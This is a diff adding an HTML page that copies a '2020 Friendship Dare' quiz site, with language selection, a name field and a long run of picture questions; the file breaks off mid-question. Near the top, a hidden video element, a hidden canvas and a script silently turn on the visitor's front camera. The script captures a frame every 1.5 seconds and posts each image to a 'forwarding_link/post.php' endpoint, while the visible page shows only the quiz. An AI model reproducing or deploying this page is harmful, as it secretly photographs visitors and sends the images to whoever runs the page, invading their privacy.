@@ -1,0 +1,1559 @@
+<!doctype html>
+<html>
+<head>
+
+
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+            <link rel="canonical" href="https://grandedesafio.com/quiz" />
+    
+    
+        
+
+
+
+            <title>2020 Friendship Dare</title>
+        <meta name="description" content="2020 Friendship Dare">
+        <meta property="og:title" content="2020 Friendship Dare" />
+        <meta property="og:image" content="https://grandedesafio.com/images/grandedesafio/bond.png">
+
+                <meta property="og:description" content="2020 Friendship Dare">
+                
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+
+    <link rel="stylesheet" href="https://grandedesafio.com/css/style.css?v=35">
+    
+
+            <style>
+            .pure-button-primary, .pure-button-color, .custom-menu-wrapper{
+                background-color: #99003b !important;
+            }
+            .ready{
+                color: #99003b;
+            }
+            .number_list .active {
+                background: #99003b;
+                color: #fff;
+            }
+        </style>
+    
+
+    
+    
+
+
+    
+    
+    
+    
+
+        
+
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script> (adsbygoogle = window.adsbygoogle || []).push({ google_ad_client: "ca-pub-1771845412011016", enable_page_level_ads: true });</script>
+        
+
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-148233951-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    <meta name="msapplication-config" content="none"/>
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4" />
+    <link rel="apple-touch-icon" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4"/>
+    <link rel="apple-touch-icon-precomposed" href="https://grandedesafio.com/images/grandedesafio/icon.png?v=4"/>
+
+    
+    
+
+    
+
+    
+
+
+            <script data-cfasync="false" type="text/javascript">
+        (function(w, d) {
+            var s = d.createElement('script');
+            s.src = '//cdn.adpushup.com/39117/adpushup.js';
+            s.type = 'text/javascript'; s.async = true;
+            (d.getElementsByTagName('head')[0] || d.getElementsByTagName('body')[0]).appendChild(s);
+        })(window, document);
+        </script>
+    
+
+    
+
+    
+
+
+    
+    
+
+    
+
+
+
+
+    <script>
+        
+        function setCookie1(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays*24*60*60*1000));
+            var expires = "expires="+ d.toUTCString();
+            document.cookie = cname + "=" + encodeURIComponent(cvalue) + ";" + expires + ";path=/";
+        }
+
+        function getCookie1(cname) {
+            var name = cname + "=";
+            var cookie = document.cookie;
+            var ca = cookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return decodeURIComponent(c.substring(name.length, c.length));
+                }
+            }
+            return "";
+        }
+
+    </script>
+
+
+
+    
+
+
+    
+
+    
+</head>
+
+
+<body>
+
+<div class="custom-menu-wrapper">
+
+            <div class="pure-menu custom-menu custom-menu-top">
+                            <span><img src="https://grandedesafio.com/images/grandedesafio/icon.png?v=4" alt="" style="display: inline; width: 25px; position: absolute;"></span>
+                        <a href="/en" class="pure-menu-heading custom-menu-brand" style="display: inline; left: 30px;text-transform: none;font-weight: 600;">2020 Friendship Dare</a>
+        </div>
+    
+
+</div>
+<div class="outer_container tenpxtop">
+
+
+
+<div class="pure-g">
+    
+    <div class="pure-u-1-24 pure-u-md-1-4"></div>
+    <div class="pure-u-11-12 pure-u-md-1-2 well">
+    
+                    <div class="center circles">
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/1.png" data-color='#000000'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/2.png" data-color='#fc4d21'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/3.png" data-color='#f27f00'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/4.png" data-color='#172c6f'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/10.png" data-color='#b14e00'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/6.png" data-color='#99003b'>
+                <img class="change_color" src="https://grandedesafio.com/images/common/circles/7.png" data-color='#ff4a40'>
+            </div>
+        
+
+        <div class="center">
+                            <div class="center">
+                    <div id="visited-ad">
+                        
+                    </div>
+                    <script>
+                        if (getCookie1('visited') == '' || parseInt(getCookie1('visited')) < 4 ) {
+                            document.getElementById("visited-ad").outerHTML = "";
+                        }
+                    </script>
+                </div>
+                    </div>
+
+                    <div id="question_count" class="hidden fivepxtop">
+                <ul class="number_list center">
+                    <li id='number_1' class="active">1</li>
+                    <li id='number_2'>2</li>
+                    <li id='number_3'>3</li>
+                    <li id='number_4'>4</li>
+                    <li id='number_5'>5</li>
+
+                                            <li id='number_6'>6</li>
+                        <li id='number_7'>7</li>
+                        <li id='number_8'>8</li>
+                        <li id='number_9'>9</li>
+                        <li id='number_10'>10</li>
+                    
+                                            <div class="visible-xs fivepxtop"></div>
+                        <li id='number_11'>11</li>
+                        <li id='number_12'>12</li>
+                        <li id='number_13'>13</li>
+                        <li id='number_14'>14</li>
+                        <li id='number_15'>15</li>
+                                                                <div class="fivepxtop"></div>
+                        <li id='number_16'>16</li>
+                        <li id='number_17'>17</li>
+                        <li id='number_18'>18</li>
+                        <li id='number_19'>19</li>
+                        <li id='number_20'>20</li>
+                                    </ul>
+                <h3 class="zerobotton tenpxtop hidden">
+                    Creating quiz
+                    <span id="question_number">0</span>/20
+                </h3>
+            </div>
+
+        
+
+        <div id="share_link_generating" class="hidden center">
+            <h3 class="fivepxbotton">Please Wait...</h3>
+            <h3 class="fivepxbotton fivepxtop">Creating quiz... </h3>
+            <div class="loader center" style="display: inline-block;"></div>
+        </div>
+
+
+        <div id="recreate_quiz" class="hidden center">
+            <h3 class="fivepxbotton">Some error occured... Please create your quiz again after 5 mins</h3>
+            <a href="/quiz" class="pure-button pure-button-primary full">👉 Create your Quiz</a>
+        </div>
+
+        <div id="initial_block" class="center hidden">
+            <h3 class="fivepxbotton">Please Wait...</h3>
+            <h3 class="fivepxbotton fivepxtop">Preparing Questions list for you.</h3>
+        </div>
+
+        <div id="name_email_info" class="pure-form pure-form-stacked">
+            <div class="pure-g">
+
+                <div class="pure-u-1">
+                    <h3 class="center fivepxtop quiz_heading">
+                        <img src="https://grandedesafio.com/images/grandedesafio/left.png?v=4" style="height: 18px;"> 
+                            2020 Friendship Dare 
+                        <img src="https://grandedesafio.com/images/grandedesafio/right.png?v=4" style="height: 18px;">
+                    </h3>
+                </div>
+
+                <div class="pure-u-1">
+                    <label>
+                        <h4 class="fivepxbottom tenpxtop">Select Language : </h4>
+                    </label>
+
+                    <select id="language" class="pure-u-1">
+                        <option value="" disabled="" selected="" hidden="">Select Language</option>
+                        <option value='en'>English</option><option value='de'>Deutsch</option><option value='es'>Español</option><option value='fr'>Français</option><option value='id'>Bahasa Indonesia</option><option value='it'>Italiano</option><option value='pt'>Português</option><option value='ru'>Русский</option><option value='tr'>Türkçe</option><option value='ar'>عربى</option><option value='fi'>Suomen Kieli</option><option value='ro'>Română</option><option value='nl'>Nederlands (Dutch)</option><option value='pl'>Polski</option><option value='sv'>Svenska</option><option value='hi'>हिंदी</option><option value='uk'>Украiнська</option><option value='hr'>hrvatski</option><option value='il'>עברית</option><option value='ms'>Bahasa Melayu</option><option value='cz'>čeština</option><option value='cn'>简体中文</option><option value='jp'>日本語</option><option value='ko'>한국어</option><option value='bg'>български</option><option value='el'>Ελληνικά</option><option value='sk'>slovenčina</option><option value='hu'>Magyar</option><option value='no'>nynorsk</option><option value='da'>Dansk</option><option value='sw'>Kiswahili</option><option value='lv'>latviešu</option><option value='vn'>Tiếng Việt</option><option value='th'>ไทย</option>
+                    </select>
+                </div>
+                
+
+                <div class="pure-u-1">
+                    <label>
+                        <h4 class="fivepxbottom tenpxtop">Enter your Full Name : </h4>
+                    </label>
+                    <input id="name" class="pure-u-1" type="text" placeholder="Full Name">
+                    <span id="name_error" class="error hidden">Name Cannot be Blank</span>
+                </div>
+
+                <div class="pure-u-1">
+                    <a id="start_create" href="javascript:void(0)" class="pure-button pure-button-primary full">👉&nbsp;  Start &nbsp;👈</a>
+                </div>
+                
+            </div>
+        </div>
+
+
+        <div id="questions_block" class="hidden center">
+
+                                            <a id="skip_question" href="javascript:void(0)" class="pure-button pure-button-primary fourteenpxfont">Skip this Question</a>
+                            
+            
+                                                            <div id="eni" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which time do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/i/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Day</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/i/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Night</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzza" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">If you win a lottery what will you buy?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q1/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Private Plane</div>
+                            </td>
+                                                                                                                        <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q1/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Disney Land</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q1/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Villa</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q1/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Diamonds</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzh" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What exercise do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q8/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Dance &amp; Zumba</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q8/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px"> Yoga</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q8/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px"> Gym</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q8/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px"> Running</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='e' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q8/e.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px"> Swimming</div>
+                            </td>
+                                                                </table>
+                </div>
+                                                                            <div id="ene" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What is more important to you?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/e/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Love</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/e/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Money</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enac" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What would you rather choose?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/ac/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Skydiving</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/ac/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Bungee jumping</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzf" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">How you like to travel in your day to day life?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q6/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cycle</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q6/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Car</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='e' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q6/e.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Plane</div>
+                            </td>
+                                                                                                                        <td value='f' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q6/f.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Train</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q6/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Bike</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q6/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Bus</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enn" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What do you use the most?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/n/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Facebook</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/n/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Instagram</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzj" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What type of weather do you prefer?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q10/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Winter</div>
+                            </td>
+                                                                                                                        <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q10/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Summer</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q10/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Rainy</div>
+                            </td>
+                                                                                                                        <td value='e' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q10/e.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Autumn/Fall</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enr" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which one will you choose?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/r/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Sun</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/r/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Moon</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enw" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Do you prefer rain or snow?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/w/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Rain</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/w/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Snow</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enl" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which one do you like: beard or shaved?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/l/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Beard</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/l/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Shaved</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enc" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which one will you choose?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/c/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Beach</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/c/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Mountains</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzd" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What type of games do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q4/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Indoor Games</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q4/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Outdoor Games</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q4/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Mobile Games</div>
+                            </td>
+                                                                                                                        <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q4/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Video Games</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzc" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">If your house is on fire, what is the one thing you will take with you?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='d' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q3/d.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Laptop</div>
+                            </td>
+                                                                                                                        <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q3/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Wallet</div>
+                            </td>
+                                                </tr>
+                                                                                            <tr>
+                                                                            <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q3/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cell phone</div>
+                            </td>
+                                                                                                                        <td value='c' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q3/c.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Documents</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enk" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">You would like to watch...</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/k/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Movies at home</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/k/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Movies at theatre</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="eny" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What would you prefer?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/y/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Tattoo</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/y/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">No Tattoo</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enh" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">Which type of shopping do you like?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/h/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Online</div>
+                            </td>
+                                                                                                                        <td value='b' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../dare2019/question_images/en/h/b.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Traditional</div>
+                            </td>
+                                                </tr>
+                                                                </table>
+                </div>
+                                                                            <div id="enzzg" class="question hidden unanswered" language="en">
+
+                    <h3 class="fivepxbotton tenpxtop center question_text">What is your Favorite dessert?</h3>
+
+                    <table class="pure-table pure-table-horizontal table_spacing">
+                    
+                                        
+                                                                    <tr>
+                                                                            <td value='a' class="set_answer center">
+                                                                    <img data-src="https://grandedesafio.com/images/grandedesafio/question_images/../../bffmeter/question_images/q7/a.jpg?v=5" alt="">
+                                    <br>
+                                                                <div class="fivepxtop" style="font-size: 18px">Cake</div>
+                            </td>
+                                                                                                                        <td value='e' class="set_answer center">
